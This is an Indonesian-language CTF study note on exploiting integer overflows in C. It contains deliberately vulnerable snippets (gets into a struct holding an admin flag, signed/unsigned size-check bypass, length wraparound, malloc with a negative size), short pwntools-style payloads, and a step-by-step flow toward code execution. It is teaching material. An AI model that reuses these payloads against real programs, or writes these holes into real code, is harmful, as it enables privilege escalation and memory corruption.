#cybersecurity

Integer overflow sering dipakai untuk **menimpa variabel** (misal flag, panjang, indeks) atau **mem-bypass pemeriksaan** sehingga operasi berbahaya diizinkan.

## 1. Variable overwrite / race dengan cek

```c
int authenticated = 0;
char buf[64];

// kalau ada overflow ke variabel authenticated:
// isi authenticated = 1 -> jadi admin
```

Variabel yang ditimpa biasanya di-declare **berurutan di stack/heap**. Overflow dari `buf` ke variabel lain:

```c
struct {
    char name[16];
    int  is_admin;      // 16 byte setelah name
} user;

gets(user.name);        // overflow -> isi is_admin = 1
```

Payload:

```python
payload = b"A" * 16          # isi name
payload += p32(1)            # timpa is_admin jadi 1
```

## 2. Bypass cek ukuran

```c
void vuln() {
    int size;
    printf("Ukuran: ");
    scanf("%d", &size);
    if (size > 64) {
        puts("Terlalu besar!");
        return;
    }
    char buf[64];
    read(0, buf, size);    // size kecil -> aman
}
```

Overflow cek: kirim **negatif** (lolos `size > 64`) tapi `read` pakai `size_t` (unsigned):

```python
io.sendline(b"-1")
# size = -1 -> lolos cek
# read(0, buf, -1) -> size_t = 18446744073709551615 -> baca semua!
```

## 3. Wrap around pada panjang

```c
unsigned short len = user_len + 1;   // user_len = 65535 -> len = 0
```

Payload:

```python
# kirim 65535 supaya len wrap jadi 0 (cek lolos, tapi logika lain salah)
```

## 4. Alokasi kecil → heap overflow

```c
int size;
scanf("%d", &size);
char *buf = malloc(size);          // size negatif -> malloc(0) / huge
read(0, buf, size);                // read ukuran asli -> heap overflow
```

## Alur eksploitasi tipikal

```
1. Program minta angka -> temukan operasi yang overflow (size+1, n*2, len-1)
2. Kirim angka ekstrem supaya hasil wrap jadi kecil/negatif
3. Cek (if) lolos, tapi operasi berbahaya (read/copy) pakai ukuran besar
4. Overflow -> timpa variabel / return address / heap metadata
5. Lanjut ke RCE (ret2win / ret2libc / heap exploit)
```

## Tips praktis

1. Baca source code (kalau ada) - cari `scanf("%d")`, `atoi`, `strlen`, `malloc(size)`, operasi `+1`/`*2` pada input.
2. Coba nilai: `-1`, `0x7fffffff`, `0x80000000`, `0xffffffff`, `65535`, `255`.
3. Kalau cek memakai signed dan operasi memakai unsigned (atau sebaliknya) - itu celahnya.
4. Integer overflow di C++ (`int64`, `unsigned long long`) jarang, tapi `int`/`short`/`char` sering.

## Catatan

- Integer overflow → buffer overflow adalah kombinasi paling umum di CTF pemula.
- `malloc(0)` mengembalikan pointer valid tapi alokasi 0 - baca banyak → heap overflow.
- Selalu cek `checksec` dan arsitektur sebelum menyusun payload lanjutan.
